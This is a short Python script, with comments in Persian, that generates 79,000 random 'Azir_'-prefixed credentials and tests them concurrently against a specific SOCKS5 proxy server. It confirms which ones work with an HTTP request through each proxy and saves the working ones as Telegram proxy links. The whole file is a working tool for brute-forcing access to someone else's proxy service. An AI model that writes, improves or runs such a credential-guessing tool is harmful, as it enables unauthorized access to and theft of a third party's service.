import asyncio
import random
import socks # کتابخانه‌ای که دوستت پیشنهاد داد
import socket

# تنظیمات طبق درخواست شما
TOTAL_PROXIES = 79000
CONCURRENT_TASKS = 200 # تعداد همزمان برای جلوگیری از بلاک شدن توسط httpbin
SERVER = 'panel.nirvana-smoke.com'
PORT = 8443
TEST_HOST = 'httpbin.org'
TEST_PORT = 80

def check_proxy_sync(user_pass):
    """
    دقیقاً همان منطق دوست شما: هندشیک SOCKS5 و تست GET 200
    """
    try:
        s = socks.socksocket()
        s.set_proxy(socks.SOCKS5, addr=SERVER, port=PORT,
                    username=user_pass, password=user_pass)
        s.settimeout(5)
        
        # اتصال به مقصد از طریق پروکسی
        s.connect((TEST_HOST, TEST_PORT))
        
        # ارسال درخواست GET
        request = (
            f"GET /ip HTTP/1.1\r\n"
            f"Host: {TEST_HOST}\r\n"
            f"Connection: close\r\n\r\n"
        )
        s.sendall(request.encode())
        
        # دریافت پاسخ
        response = s.recv(1024)
        s.close()
        
        if b"200 OK" in response:
            return f"https://t.me/socks?server={SERVER}&port={PORT}&user={user_pass}&pass={user_pass}"
    except:
        return None

async def run_check(user_pass):
    # اجرای کد سینک در محیط اسینک برای سرعت بالا
    return await asyncio.to_thread(check_proxy_sync, user_pass)

async def main():
    print(f"Starting Pro Scan: {TOTAL_PROXIES} proxies via SOCKS5 Handshake...")
    alive_proxies = []
    
    for i in range(0, TOTAL_PROXIES, CONCURRENT_TASKS):
        batch = ['Azir_' + ''.join(random.choice('0123456789abcdef') for _ in range(18)) for _ in range(CONCURRENT_TASKS)]
        tasks = [run_check(u) for u in batch]
        results = await asyncio.gather(*tasks)
        
        found = [res for res in results if res]
        alive_proxies.extend(found)
        
        if (i + CONCURRENT_TASKS) % 1000 == 0:
            print(f"Checked: {i + CONCURRENT_TASKS} | Found so far: {len(alive_proxies)}")

    with open('alive.txt', 'w') as f:
        for p in alive_proxies:
            f.write(p + '\n')
    print(f"Done! Total working proxies: {len(alive_proxies)}")

if __name__ == "__main__":
    asyncio.run(main())
